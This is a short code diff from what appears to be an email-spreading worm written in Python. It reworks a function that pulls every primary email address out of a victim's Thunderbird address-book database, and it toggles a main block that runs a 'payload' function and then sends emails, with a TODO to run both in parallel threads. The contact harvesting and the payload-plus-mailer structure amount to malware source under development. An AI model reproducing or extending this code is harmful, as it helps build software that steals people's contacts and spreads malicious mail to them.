@@ -298,18 +298,15 @@ def read_email_addresses_thunderbird():
     email_addresses = []
     
     if isfile(database):
-        try:
-            con = sqlite3.connect(database)
-        except Error as e:
-            print(e)
-        with con:
-            cur = con.cursor()
-            cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
-            rows = cur.fetchall()
-            for row in rows:
-                (email_addr,) = row # unpack the tuple returned by fetchall()
-                email_addresses.append(email_addr)
-        return email_addresses
+        with sqlite3.connect(database) as con:
+            with con:
+                cur = con.cursor()
+                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
+                rows = cur.fetchall()
+                for row in rows:
+                    (email_addr,) = row # unpack the tuple returned by fetchall()
+                    email_addresses.append(email_addr)
+            return email_addresses
     else:
         return None
 
@@ -358,5 +355,5 @@ def send_email():
 
 if __name__ == "__main__":
     # TODO: Start two different threads, one for executing the payload and one for sending emails.
-    payload()
+    # payload()
     send_email()
